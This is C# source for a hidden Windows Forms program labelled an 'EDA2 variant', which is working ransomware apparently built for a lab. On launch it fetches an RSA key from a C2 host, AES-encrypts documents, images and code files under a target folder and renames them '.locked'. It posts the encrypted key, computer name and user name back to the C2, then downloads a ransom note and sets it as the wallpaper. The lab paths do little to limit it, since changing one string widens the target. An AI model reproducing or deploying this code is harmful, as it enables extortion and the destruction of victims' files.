// EDA2 variant with Local Encryption and key exfil to C2 server

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Collections.Specialized;
using System.Net;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;
using System.Runtime.InteropServices;



namespace eda2
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        private static bool OAEP = false; //Optimal Asymmetric Encryption Padding
        const int keySize = 2048; //key size for RSA algorithm
        string publicKey; // RSA public key used to encrypt AES secret key
        string encryptedKey; // RSA-encrypted AES symmetric key
        string aes_key; // AES symmetric key used for local file encryption
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\Users\\";
        string generatorUrl = "http://c2.lab.local/panel/publickey"; // serves RSA public key
        string keySaveUrl = "http://c2.lab.local/panel/savekey.php";    // exfils the encrypted AES key
        string backgroundImageUrl = "http://c2.lab.local/panel/ransomnote"; //desktop background ransomnote


        public Form1()
        {
            this.Load += new EventHandler(Form1_Load);
            this.Shown += new EventHandler(Form_Shown);

            this.Opacity = 0;
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;
            this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            // starts encryption at form load
            startAction();
        }


        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
        }

        public string getPublicKey(string url)
        {
            using (WebClient webClient = new WebClient())
            {
                return webClient.DownloadString(url);
            }
        }

        // Sends encryptedKey variable with "aesencrypted" parameter to server with a POST request
        public void sendKey(string url)
        {
            using (WebClient webClient = new WebClient())
            {
                NameValueCollection formData = new NameValueCollection();

                formData["pcname"] = computerName;
                formData["username"] = userName;
                formData["aesencrypted"] = encryptedKey;

                webClient.UploadValues(url, "POST", formData);
            }
        }

        //Starts the whole process
        public void startAction()
        {
            string dataPath = @"C:\Users\Public\A01_TestData";
            publicKey = getPublicKey(generatorUrl);
            aes_key = GenerateKey(32);
            string keyPath = @"C:\Users\Public\A01_4_Lab_Encryption_Key.txt";
            System.IO.File.WriteAllText(keyPath, aes_key);
            if (Directory.Exists(dataPath))
            {
                EncryptDirectory(dataPath, aes_key);
            }
            encryptedKey = EncryptKeyRSA(aes_key, keySize, publicKey);
            sendKey(keySaveUrl);
            aes_key = null;
            encryptedKey = null;
            string backgroundImageName = userDir + userName + "\\ransom.jpg";
            SetWallpaperFromWeb(backgroundImageUrl, backgroundImageName);
            System.Windows.Forms.Application.Exit();

        }

        public void EncryptFile(string file, string key)
        {
            if (file.EndsWith(".locked", StringComparison.OrdinalIgnoreCase))
            {
                return;
            }

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] keyBytes = Encoding.UTF8.GetBytes(key);

            // Hash the AES key material with SHA256 before derivation.
            keyBytes = SHA256.Create().ComputeHash(keyBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, keyBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            File.Move(file, file + ".locked");
        }

        // Encrypts a directory and all its subdirectories
        public void EncryptDirectory(string location, string key)
        {
            var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
                ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln",
                ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);

            for (int i = 0; i < files.Length; i++)
            {
                string extension = Path.GetExtension(files[i]).ToLowerInvariant();

                if (validExtensions.Contains(extension))
                {
                    try
                    {
                        EncryptFile(files[i], key);
                    }
                    catch
                    {
                        // Ignore individual file errors so remaining files continue to be processed.
                    }
                }
            }

            for (int i = 0; i < childDirectories.Length; i++)
            {
                try
                {
                    EncryptDirectory(childDirectories[i], key);
                }
                catch
                {
                    // Ignore inaccessible directories and continue.
                }
            }
        }

        // Encrypts the AES key with the RSA public key
        public static string EncryptKeyRSA(string key, int keySize, string publicKeyXml)
        {
            var encrypted = RSAEncrypt(
                Encoding.UTF8.GetBytes(key),
                keySize,
                publicKeyXml);

            return Convert.ToBase64String(encrypted);
        }


        //Rsa encryption algorithm
        public static byte[] RSAEncrypt(byte[] keyBytes, int keySize, string publicKeyXml)
        {

            using (var provider = new RSACryptoServiceProvider(keySize))
            {
                provider.FromXmlString(publicKeyXml);
                return provider.Encrypt(keyBytes, OAEP);
            }
        }

        // AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] keyBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream ms = new MemoryStream())
            {
                using Aes AES = Aes.Create();

                AES.KeySize = 256;
                AES.BlockSize = 128;
                AES.Mode = CipherMode.CBC;

                byte[] derived = new byte[48];

                Rfc2898DeriveBytes.Pbkdf2(
                    keyBytes,
                    saltBytes,
                    derived,
                    1000,
                    HashAlgorithmName.SHA256);

                AES.Key = derived[..32];
                AES.IV = derived[32..48];

                using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                    cs.Close();
                }

                encryptedBytes = ms.ToArray();
            }

            return encryptedBytes;
        }

        // creates random AES encryption key
        public string GenerateKey(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        //Changes desktop background image
        public void SetWallpaper(String path)
        {
            SystemParametersInfo(0x14, 0, path, 0x01 | 0x02);
        }

        //Downloads image from lab C2 server
        private void SetWallpaperFromWeb(string url, string path)
        {
            using (WebClient webClient = new WebClient())
            {
                webClient.DownloadFile(new Uri(url), path);
            }

            if (File.Exists(path))
            {
                SetWallpaper(path);
            }
        }


    }


}

